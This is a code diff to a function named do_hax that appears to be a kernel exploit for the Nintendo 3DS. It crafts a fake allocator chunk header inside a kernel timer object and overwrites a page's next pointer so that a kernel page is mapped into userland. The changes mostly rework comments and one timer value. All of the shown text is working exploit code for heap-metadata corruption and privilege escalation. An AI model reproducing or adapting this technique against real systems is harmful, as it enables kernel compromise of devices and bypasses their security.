@@ -162,11 +162,13 @@ void do_hax() {
     printf("Prev: %08X\n", (int) hdr.prev);
 
     // Create a timer, crafting a fake MemChunkHdr out of its data.
-    // Prev does not matter, Next must not be null as long as the allocator needs more pages to allocate.
+    // Neither next nor prev matter as verification happens prior to the overwrite.
+    // Additionally, these values are not used other than next when traversing pages to map to userland.
+    // As the kernel page is the last to be mapped, this is irrelevant.
     Handle timer;
     u32 timerAddr;
     svcCreateTimerKAddr(&timer, 0, &timerAddr);
-    svcSetTimer(timer, 0, (s64) (u32) hdr.next);
+    svcSetTimer(timer, 0, 0);
 
     KTimer* timerObj = (KTimer*) (timerAddr - 4);
     MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
@@ -175,7 +177,7 @@ void do_hax() {
     printf("Timer object: 0x%08X\n", (int) timerObj);
     printf("Fake header address: 0x%08X\n", (int) fakeHdr);
 
-    // Allocate a buffer for the kernel page backup.
+    // Allocate a buffer to back up the allocated kernel page before it is cleared by the allocation code.
     //void* backup = malloc(PAGE_SIZE);
 
     // Debug output.
@@ -188,7 +190,7 @@ void do_hax() {
     wait_raw_mapped(memAddr);
     ((MemChunkHdr*) memAddr)->next = fakeHdr;
 
-    // Backup the kernel page before it is cleared.
+    // Back up the kernel page before it is cleared.
     //wait_raw_mapped(memAddr + PAGE_SIZE);
     //printf("Value: %08X\n", *(int*) (memAddr + PAGE_SIZE));
     //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
